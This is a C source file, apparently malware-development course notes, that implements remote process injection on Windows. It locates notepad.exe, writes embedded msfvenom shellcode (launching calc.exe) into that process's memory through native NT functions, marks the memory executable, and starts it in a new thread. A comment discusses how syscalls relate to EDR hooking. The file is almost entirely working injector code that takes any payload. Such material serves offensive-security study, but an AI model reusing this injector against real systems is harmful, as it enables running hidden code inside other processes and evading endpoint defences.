#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include "syscall-func.h"

/*
Maldev Academy Notes
Remote Process Injection via syscall
*/

// Payload - msfvenom -p windows/x64/exec CMD=calc.exe -f c 
unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2,
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48,
	0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7,
	0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52,
	0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01,
	0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49,
	0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34,
	0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0,
	0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1,
	0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0,
	0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41,
	0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0,
	0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF,
	0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0,
	0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80,
	0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
	0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C,
	0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
};

int main() {
	HANDLE			hSnapShot = NULL;
	HANDLE			hProcess = NULL;
	PROCESSENTRY32	Proc = {
					.dwSize = sizeof(PROCESSENTRY32)
	};

	PVOID	pShellcodeAddress = NULL;
	SIZE_T	sSizeOfShellcode = sizeof(shellcode);
	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;
	LPWSTR	szProcessName = L"notepad.exe";
	HANDLE	hThread = NULL;

	// Create process snapshot
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	// Loop through each process in the snapshot
	Process32First(hSnapShot, &Proc);
	do {
		// Compare process with one provided in argument
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Get handle of matching process
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
		}
		// Next process if not matching
	} while (Process32Next(hSnapShot, &Proc));

	// Get NTDLL.DLL module handle
	HMODULE	hNtdll = GetModuleHandle(L"NTDLL.DLL");

	// Get syscall address
	fnNtAllocateVirtualMemory	pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	fnNtProtectVirtualMemory	pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	fnNtWriteVirtualMemory		pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	fnNtCreateThreadEx			pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	// Allocate memory in notepad.exe process using NtAllocateVirtualMemory syscall
	pNtAllocateVirtualMemory(hProcess, &pShellcodeAddress, 0, &sSizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Write payload to the allocated memory space - pShellcodeAddress
	pNtWriteVirtualMemory(hProcess, pShellcodeAddress, &shellcode, sSizeOfShellcode, &sNumberOfBytesWritten);

	// Change memory permission to RWX
	// If NTDLL.DLL is hooked, calling pNtAllocateVirtualMemory will be detected. It's because the syscall is being called by its address (hooked) instead of called via SSN, which avoids hooking.
	pNtProtectVirtualMemory(hProcess, &pShellcodeAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection);

	// Launch the shellcode in a new thread
	pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, NULL, NULL, NULL, NULL, NULL);

	// Using this to give enough time for payload to detonate. Or the main thread will exit prematurely.
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}